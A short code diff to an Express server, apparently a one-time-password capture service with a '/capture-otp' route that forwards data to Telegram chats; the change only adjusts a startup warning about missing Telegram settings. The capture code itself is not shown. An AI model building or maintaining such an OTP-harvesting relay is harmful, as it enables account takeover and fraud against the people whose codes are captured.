@@ -88,7 +88,7 @@ app.post("/capture-otp", (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
-  if (!TOKEN || !CHAT_IDS) {
+  if (!TOKEN || CHAT_IDS.length === 0) {
     console.log(
       "⚠️  WARNING: Telegram environment variables are not fully configured. Set TELEGRAM_TOKEN and TELEGRAM_CHAT_ID in Render or your environment.",
     );
